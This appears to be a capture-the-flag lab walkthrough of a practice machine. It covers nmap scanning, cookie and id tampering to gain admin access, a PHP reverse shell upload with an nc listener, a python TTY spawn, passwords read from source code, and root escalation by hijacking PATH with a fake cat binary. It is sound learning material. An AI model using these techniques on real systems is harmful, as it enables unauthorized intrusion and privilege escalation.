Task 1

With what kind of tool can intercept web traffic?
A **Proxy**

To begin our web enemuration we can begin with an nmap scan:
`nmap -sC -sV {IP}`

![[Pasted image 20241106005108.png]]

Results show open ports for SSH and HTTP

We can begin by visiting the HTTP web server using burp suite.

Burp will reveal the web pages request once accessed 
![[Pasted image 20241106011050.png]]
which shows the cdn-cgi/login page

navigating to this page shows you can login as guest. 

Logging in and navigating the pages will reveal a page with admin rights. 
![[Pasted image 20241106011241.png]]
Using Firefox's inspect element, you can see the cookies, show both the guest role, and a user role with a cookie value.
We can use this to manipulate the web page into thinking we are user. 
http://10.129.255.154/cdn-cgi/login/admin.php?content=accounts&id=1
Editing the accounts id to =1 it will show the adim access ID and email. 
![[Pasted image 20241106020707.png]]


![[Pasted image 20241106020554.png]]

editing the cookies to the value  enumerated on the admin account will allow access to the upload page. 
![[Pasted image 20241106020742.png]]

Now that we have access to an upload page, we can consider this a foothold to inject a shell.  
using a simple php reverse shell we can upload it to the server and gain access. 

A reverse shell can be found in the webshells directory, specifically the php-reverse-shell.php
- by editing the contents of the script, we can assign our desired ip and port to activate the reverse shell.
- `gobuster dir --url http://10.129.255.154/ -w /usr/share/dirbuster/directory-list-2.3-small.txt`
- Gobuster reveals the url: 

http:/10.129.255.154/uploads


![[Pasted image 20241106023636.png]]

Since we have uploaded a reverse shell to the uploads server, we can access it by entering it to the url:
http://10.129.255.154/uploads/php-reverse-shell.php

before we access the server, we must set up a listening session on the port we specified:
`nc -lnvp 4444`
Once the URL is accessed when listening, the shell will be shown on the listener. 

![[Pasted image 20241106024102.png]]



Task 6

What is the file that contains the password that is shared with the robert user?

Navigating to the web-servers source code in the cdn-cgi/login directory we can cat and grep any instances of a passwd in the source code.

```
$ cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
$ 

```

The source code reveals the password for admin as MEGACORP_4dm1n!!

In the same folder for the web login we can see a couple other files, using cat on the db.php file reveals the login information for Robert. 
![[Pasted image 20241106030825.png]]

```
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

In order to gain privileges as robert in the reverse shell, we fist must spawn a tty intractable shell to run commands such as su and sudo.

- Spawn a TTY shell using python using:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Then login to Roberts account with:

```
su robert
password: M3g4C0rpUs3r!
```
Inside of Roberts home directory we can find the file user.txt which reveals the user flag.
![[Pasted image 20241106032852.png]]

In order to get the root flag we must explot a path using the root user. 

The Bugtracker app mentioned seems to use root privileges no matter the user. so this can be exploited. 

The bugtracker application seems to be using the cat command to search for files. 

We can manipulate this command by creating our own cat file in the /tmp dir.

We will add he contents /bin/sh to the cat file to create our own shell inside the bugtracker application. 

This is done by setting the path to the /tmp dir using the command 
`export PATH=/tmp:$PATH`
and then running the bug tracker application inside the /tmp directory.

![[Pasted image 20241106034406.png]]

Having access to root we can now navigate to the root folder with
`cd /root`

once in root using ls will reveal the root.txt file

This file can not be enumerated using cat, or nano so we must use other commands to reveal the flag.


Since we know the size isn't over 100 characters for a flag we can use head -100 root.txt and reveal all the contents of root.txt

